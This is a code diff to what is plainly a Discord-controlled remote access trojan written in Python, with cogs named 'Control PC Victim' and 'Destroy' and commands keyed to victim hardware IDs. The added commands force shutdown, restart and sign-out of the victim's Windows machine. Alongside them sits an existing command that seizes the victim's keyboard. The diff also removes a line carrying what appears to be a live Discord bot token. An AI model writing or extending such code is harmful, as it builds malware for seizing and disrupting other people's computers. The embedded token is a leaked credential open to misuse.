@@ -150,6 +150,24 @@ class Control(commands.Cog, description='Control PC Victim'):
 		threading.Thread(target = msg, args = (amount, method, message, )).start()
 		await SendOutput(ctx, "Done!")
 
+	@commands.command(aliases=["shutdown", "sd"], brief='Shutdown PC Victim', description='Shutdown PC Victim')
+	async def Shutdown(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+		output = str(subprocess.check_output('shutdown /f /t 0'))
+
+	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
+	async def Restart(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+		output = str(subprocess.check_output('shutdown /f /r /t 0'))
+
+	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
+	async def SignOut(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+		output = str(subprocess.check_output('shutdown /l'))
+
 	@commands.command(aliases=["kboard", "kb"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
 	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
 		if not CheckHWID(HWID):
@@ -188,5 +206,3 @@ async def on_ready():
 	await client.add_cog(Destroy())
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
-
-client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GNy7c2.0Gl4qgQw-s5lUN7m32lRGKcIMFsTrFclewuhA4')
